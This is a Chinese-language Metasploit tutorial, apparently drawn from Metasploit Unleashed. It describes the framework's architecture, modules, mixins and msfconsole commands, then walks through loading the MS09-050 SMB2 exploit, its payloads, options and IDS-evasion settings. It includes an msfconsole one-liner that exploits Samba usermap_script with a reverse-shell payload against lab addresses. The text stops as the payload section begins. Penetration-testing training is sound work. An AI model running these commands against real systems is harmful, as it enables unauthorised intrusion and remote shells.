# Metasploit 教程

内容来源：https://www.offensive-security.com/metasploit-unleashed

## 介绍

### 准备工作

学习这部分知识，需要准备安装有Metasploit的实验环境，例如Kali虚拟机。

此外，还应当准备一些练习用的靶机。

### Metasploit 体系架构

#### 文件系统和库

在Kali linux中，metasploit作为package被提供，安装在```/usr/share/metasploit-framework``` 目录下。

![msfu-lib0-1](images/metasploit/msfu-lib0-1.png)

##### 文件系统

MSF中有一些重要的目录：
- data，包含了一些可编辑文件，用于存放某些exploits、wordlists、images等的二进制需求。
- documentation，包含文档。
- lib，包含了MSF代码所用的库。
- modules，包含了MSF中的exploits、auxiliary、post modules、payloads、encoders、nop generators。
- plugins，包含了一些插件。
- scripts，包含了meterpreter 和 别的脚本。
- tools，包含了各种有用的命令行工具。

##### Metasploit 库

有许多MSF库用于辅助渗透过程，例如HTTP请求或攻击载荷编码。重要的有：
- Rex
  - 很多任务的基础库
  - 操作sockets，protocols，text tranformations等
  - SSL, SMB, HTTP, XOR, Base64, Unicode
- Msf::Core
  - 提供‘basic’ API
  - 定义 Metasploit Framework
- Msf::Base
  - 提供 ‘friendly’ API
  - 提供简化的APIs for use in the Framework

#### Metasploit Modules and Locations

Metasploit 模块放在```/usr/share/metasploit-framework/modules/``` 中，而自定义的模块常放在``` ~/.msf4/modules/.```中。

基本的模块包括：

- Exploits，渗透模块；
- Auxiliary，辅助模块，提供端口扫描，模糊，嗅探等；
- Payloads
- Encoders
- Nops

上面的模块是MSF启动后会自动加载的，额外的模块目录，可以使用```-m```选项加载。例如：
```msfconsole -m ~/secret-modules/```

或者在启动MSF后，使用```loadpath```命令。
```
msf > loadpath
Usage: loadpath 

Loads modules from the given directory which should contain subdirectories for
module types, e.g. /path/to/modules/exploits

msf > loadpath /usr/share/metasploit-framework/modules/
Loaded 399 modules:
    399 payloads
```

#### Metasploit Object Model

MSF框架可参考下图：

![msfarch2](images/metasploit/msfarch2.png)

在Metasploit框架中，所有模块都是Ruby类。
- 模块继承自特定于类型的类
- 特定于类型的类继承自Msf :: Module类
- 模块之间有共享的通用API
- 有效负载略有不同。

Payload是在运行时从各种组件创建的，分阶段（stages）将需要stager粘在一起。

#### Mixins and plugins

MSF是RUBY语言编写的。Ruby有以下特点：
- 每个class仅有一个parent
- 一个class可能包括许多Modules
- Modules可以增加新methods
- Modules可以重载老methods
- Metasploit modules继承了Msf:Module，而且包含了mixins，以增加特性。

##### Metasploit Mixins

Mixins很容易实现，它将一个类包含到另一个里面。

混入与继承既不同又相似。

混入可以重载一个类的方法。

Mixins can add new features and allows modules to have different ‘flavors’.
- Protocol-specific (HTTP, SMB)
- Behaviour-specific (brute force)
- connect() is implemented by the TCP mixin
- connect() is then overloaded by FTP, SMB, and others

Mixins can change behavior.
- The Scanner mixin overloads run()
- Scanner changes run() for run_host() and run_range()
- It calls these in parallel based on the THREADS setting
- The BruteForce mixin is similar

```
class MyParent
     def woof
          puts “woof!”
     end
end

class MyClass > MyParent
end

object = MyClass.new
object.woof() => “woof!”

================================================================

module MyMixin
     def woof
          puts “hijacked the woof method!”
     end
end

class MyBetterClass > MyClass
     include MyMixin
end
```

##### Metasploit Plugins

插件类似API一样在工作。

- They manipulate the framework as a whole
- Plugins hook into the event subsystem
- They automate specific tasks that would be tedious to do manually

Plugins only work in the msfconsole.
- Plugins can add new console commands
- They extend the overall Framework functionality

## MSF 基础

### MSFcli

msfcli 为MSF提供了一个强力的命令行接口，它允许简单的加入metasploit 渗透模块到任何你生成的脚本中。

现在使用它的方法是```-x```选项，例如：

```
root@kali:~# msfconsole -x "use exploit/multi/samba/usermap_script;\
set RHOST 172.16.194.172;\
set PAYLOAD cmd/unix/reverse;\
set LHOST 172.16.194.163;\
run"
```

可以使用下列方法获得帮助：
```
root@kali:~# msfcli -h
Usage: /usr/bin/msfcli<option=value> [mode]
===========================================================

    Mode           Description
    ----           -----------
    (A)dvanced     Show available advanced options for this module
    (AC)tions      Show available actions for this auxiliary module
    (C)heck        Run the check routine of the selected module
    (E)xecute      Execute the selected module
    (H)elp         You're looking at it baby!
    (I)DS Evasion  Show available ids evasion options for this module
    (O)ptions      Show available options for this module
    (P)ayloads     Show available payloads for this module
    (S)ummary      Show information about this module
    (T)argets      Show available targets for this exploit module

Examples:
msfcli multi/handler payload=windows/meterpreter/reverse_tcp lhost=IP E
msfcli auxiliary/scanner/http/http_version rhosts=IP encoder= post= nop= E
```

#### Benefits of the MSFcli Interface

- 支持启动 exploits and auxiliary modules
- 有助于特殊任务
- 好学
- 易于测试一个新开发的渗透
- 时一次性渗透的好工具
- 快速渗透

The only real drawback of msfcli is that it is not supported quite as well as msfconsole and it can only handle one shell at a time, making it rather impractical for client-side attacks. It also doesn’t support any of the advanced automation features of msfconsole.

### MSFconsole 命令

#### Core Commands
|命令|功能|
|-|-|
|back|从当前上下文返回原环境。|
|banner| 显示标志 awesome metasploit banner|
|cd| 进入某个工作目录|
|color| 色彩|
|connect|与某个主机通信|
|edit|  使用 $VISUAL or $EDITOR 编辑当前模块|
|exit|  退出控制台|
|get|  获取某个上下文相关的变量的值。|
|getg| 获取某个全局变量的值|
|go_pro|登录msf web ui|
|grep|  GREP另一个命令输出|
|help|  Help menu|
|info| 显示一个或多个模块的信息|
|irb|   Drop into irb scripting mode|
|jobs| 显示和管理作业|
|kill| 杀死作业|
|load| 调用一个框架插件|
|loadpath|从指定路径查找并加载模块。|
|makerc|Save commands entered since start to a file|
|popm|  Pops the latest module off the stack and makes it active|
|previous|Sets the previously loaded module as the current module|
|pushm| Pushes the active or list of modules onto the module stack|
|quit|  Exit the console|
|reload_all|Reloads all modules from all defined module paths|
|rename_job|Rename a job|
|resource|Run the commands stored in a file|
|route| Route traffic through a session|
|save|  Saves the active datastores|
|search|Searches module names and descriptions|
|sessions|Dump session listings and display information about sessions|
|set|   Sets a context-specific variable to a value|
|setg|  Sets a global variable to a value|
|show|  Displays modules of a given type, or all modules|
|sleep| Do nothing for the specified number of seconds|
|spool| Write console output into a file as well the screen|
|threads|View and manipulate background threads|
|unload|Unload a framework plugin|
|unset| Unsets one or more context-specific variables|
|unsetg|Unsets one or more global variables|
|use|   Selects a module by name|
|version|Show the framework and console library version numbers|

具体参考：https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/

### 渗透模块（exploit）

使用渗透模块一般有以下几个步骤：

1.加载某个渗透模块.

例如：
```
msf > use  exploit/windows/smb/ms09_050_smb2_negotiate_func_index
msf exploit(ms09_050_smb2_negotiate_func_index) > help
...snip...
Exploit Commands
================

    Command       Description
    -------       -----------
    check         Check to see if a target is vulnerable
    exploit       Launch an exploit attempt
    pry           Open a Pry session on the current module
    rcheck        Reloads the module and checks if the target is vulnerable
    reload        Just reloads the module
    rerun         Alias for rexploit
    rexploit      Reloads the module and launches an exploit attempt
    run           Alias for exploit

msf exploit(ms09_050_smb2_negotiate_func_index) >
show
Using an exploit also adds more options to the show command.

MSF Exploit Targets
msf exploit(ms09_050_smb2_negotiate_func_index) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Windows Vista SP1/SP2 and Server 2008 (x86)
```

2.查看可用载荷

例如：
```
msf exploit(ms09_050_smb2_negotiate_func_index) > show payloads

Compatible Payloads
===================

   Name                              Disclosure Date  Rank    Description
   ----                              ---------------  ----    -----------
   generic/custom                                     normal  Custom Payload
   generic/debug_trap                                 normal  Generic x86 Debug Trap
   generic/shell_bind_tcp                             normal  Generic Command Shell, Bind TCP Inline
   generic/shell_reverse_tcp                          normal  Generic Command Shell, Reverse TCP Inline
   generic/tight_loop                                 normal  Generic x86 Tight Loop
   windows/adduser                                    normal  Windows Execute net user /ADD
...snip...
```

3.查看相关选项

例如：
```
MSF Exploit Options
msf exploit(ms09_050_smb2_negotiate_func_index) > show options

Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  445              yes       The target port (TCP)
   WAIT   180              yes       The number of seconds to wait for the attack to complete.


Exploit target:

   Id  Name
   --  ----
   0   Windows Vista SP1/SP2 and Server 2008 (x86)
```

4.查看高级选项。

例如：
```
msf exploit(ms09_050_smb2_negotiate_func_index) > show advanced

Module advanced options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):

   Name                    Current Setting    Required  Description
   ----                    ---------------    --------  -----------
   CHOST                                      no        The local client address
   CPORT                                      no        The local client port
   ConnectTimeout          10                 yes       Maximum number of seconds to establish a TCP connection
   ContextInformationFile                     no        The information file that contains context information
   DisablePayloadHandler   false              no        Disable the handler code for the selected payload
   EnableContextEncoding   false              no        Use transient context when encoding payloads
...snip...

```

5.查看免杀（Evasion）

例如：
```
msf exploit(ms09_050_smb2_negotiate_func_index) > show evasion
Module evasion options:

   Name                           Current Setting  Required  Description
   ----                           ---------------  --------  -----------
   SMB::obscure_trans_pipe_level  0                yes       Obscure PIPE string in TransNamedPipe (level 0-3)
   SMB::pad_data_level            0                yes       Place extra padding between headers and data (level 0-3)
   SMB::pad_file_level            0                yes       Obscure path names used in open/create (level 0-3)
   SMB::pipe_evasion              false            yes       Enable segmented read/writes for SMB Pipes
   SMB::pipe_read_max_size        1024             yes       Maximum buffer size for pipe reads
   SMB::pipe_read_min_size        1                yes       Minimum buffer size for pipe reads
   SMB::pipe_write_max_size       1024             yes       Maximum buffer size for pipe writes
   SMB::pipe_write_min_size       1                yes       Minimum buffer size for pipe writes
   TCP::max_send_size             0                no        Maxiumum tcp segment size.  (0 = disable)
   TCP::send_delay                0                no        Delays inserted before every send.  (0 = disable)
```

### 攻击载荷（payload）

MSF中的攻击载荷（payload）对应于某个渗透模块（exploit）。MSF中有3种不同类型的载荷模块：

- singles
- stagers
- stages

